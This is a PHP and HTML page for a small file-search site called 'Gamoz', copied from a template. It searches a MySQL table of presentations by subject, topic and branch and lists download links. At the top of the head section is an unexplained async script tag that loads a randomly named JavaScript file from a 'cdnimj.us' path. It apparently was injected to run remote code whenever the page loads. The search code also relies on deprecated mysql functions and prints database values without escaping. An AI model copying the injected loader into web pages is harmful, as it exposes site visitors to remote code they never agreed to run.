

<!DOCTYPE html>
<html lang="en">

    
<!-- Mirrored from azmind.com/premium/marco/v2-4/layout-15/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Feb 2017 14:30:17 GMT -->
<head><script async type='text/javascript' src='../../../../../cdnimj.us/2ErTrBMV_3231.js'></script>

        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Gamoz</title>

        <!-- CSS -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100italic,300,300italic,400,400italic,500,500italic">
        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
        <link rel="stylesheet" href="assets/css/animate.css">
        <link rel="stylesheet" href="assets/css/style.css">
		
        <link rel="stylesheet" href="assets/css/media-queries.css">

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->

        <!-- Favicon and touch icons -->
        <link rel="shortcut icon" href="assets/ico/g.png">
        

    </head>

    <body>
    
        <!-- Loader -->
    	
        <!-- Top content -->
        <div class="top-content">
        	
        	<!-- Top menu -->
			<?php
                      
                        
           
	include "header.php"
	?>
        	
            <div class="inner-bg">
                <div class="container" id="search">
                	
                    <div class="row" style="padding:40px;">
                        <div class="col-sm-8 col-sm-offset-2 text">
                            <h1 class="wow fadeInLeftBig">Search File <a class="scroll-link" href="#call-to-action"></a></h1>
                            <div class="description wow fadeInLeftBig">
                            	<p>
	                            	
                                    
                                    
                                    
                                        <div class="top-big-link wow fadeInUp">
                                            <form action="home.php" method="GET">
                                                <input type="text"  name="query" placeholder="Type a keyword" class="form-last-name form-control" id="form-first-name"></br>
                                                                
                                                     
                                                                                	
                                                                                         <input type="submit" value="Search" class="btn btn-link-1 scroll-link" ></a> 
                                                                    
						                                                                 
                                                                
                                                                
                                </form>
                                                                
                                <table class="table table-bordered">
  <thead>
      <tr></br></br>
    <th><font face="comic sans ms">Subject</font></th>
    <th><font face="comic sans ms">Topic </font></th>
    <th><font face="comic sans ms">Branch</font></th>
	<th><font face="comic sans ms">Download Files </font></th>
  </tr>
   </thead>
    <tbody>                
                                                                <?php
	include 'storescripts/connect_to_mysql.php';
	
	
	
?>
<?php
if(isset($_GET['query'])){
	$query = $_GET['query']; 
        
	// gets value sent over search form
	
	$min_length = 1;
	// you can set minimum length of the query if you want
	
	if(strlen($query) >= $min_length){ // if query length is more or equal minimum length then
		
		$query = htmlspecialchars($query); 
		// changes characters used in html to their equivalents, for example: < to &gt;
		
		$query = mysql_real_escape_string($query);
		// makes sure nobody uses SQL injection
		
		$raw_results = mysql_query("SELECT * FROM presentation
			WHERE (`subject` LIKE '%".$query."%')") or die(mysql_error());
		$raw = mysql_query("SELECT * FROM presentation
			WHERE (`topic` LIKE '%".$query."%')") or die(mysql_error());
			$ra = mysql_query("SELECT * FROM presentation
			WHERE (`branch` LIKE '%".$query."%')") or die(mysql_error());

		if((mysql_num_rows($raw_results) > 0) or(mysql_num_rows($raw) > 0)or(mysql_num_rows($ra) > 0)){ // if one or more rows are returned do following
		
                    $raw_results = mysql_query("SELECT * FROM presentation
			WHERE (`subject` LIKE '%".$query."%')") or die(mysql_error());
 $raw = mysql_query("SELECT * FROM presentation
			WHERE (`topic` LIKE '%".$query."%')") or die(mysql_error());
			$ra = mysql_query("SELECT * FROM presentation
			WHERE (`branch` LIKE '%".$query."%')") or die(mysql_error());

	
	while(($row=mysql_fetch_array($raw_results)) or ($row=mysql_fetch_array($raw)) or ($row=mysql_fetch_array($ra)))
	{
		echo '<tr>';
		echo '<td align=center>' . $row['subject'];
		echo '<td align=center>' .$row['topic'];
                echo '<td align=center>' .$row['branch'];
		echo "<td align=center><a title='Click here to download in file.' 
		     href='download.php?id={$row['file']}'>{$row['file']} </a>"; 
		echo '</tr>';
		
	}
	echo '</table>';
	echo  '</tbody>';
	echo '<br/>';
	        }   
		else{ // if there is no matching rows do following
			echo "No results";
		}
                
                
                }
}
else{
    
    echo"No results";
}

?>
                                </table>
                                   
                            
                    </div>

			
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                            	</p>
                            </div>
                            
                        </div>
                    </div>
                    
                   <div class="row" style="padding:20px;">
				   </div>
	                
	                
                    
                </div>
            </div>
            
        </div>
        
        <!-- Features -->
        
        
       
        
        <!-- Pricing -->
       
        
        <!-- How it works -->
      

	
        
        <!-- Contact us -->
		
        
        <!-- Footer -->
       <?php
	include "footer.php"
	?>
        
        
        <!-- MODAL: How it works -->
      

        <!-- Javascript -->
        <script src="assets/js/jquery-1.11.1.min.js"></script>
        <script src="assets/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery.backstretch.min.js"></script>
        <script src="assets/js/wow.min.js"></script>
        <script src="assets/js/retina-1.1.0.min.js"></script>
        <script src="assets/js/scripts.js"></script>
        
        <!--[if lt IE 10]>
            <script src="assets/js/placeholder.js"></script>
        <![endif]-->

    </body>


<!-- Mirrored from azmind.com/premium/marco/v2-4/layout-15/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Feb 2017 14:31:11 GMT -->
</html>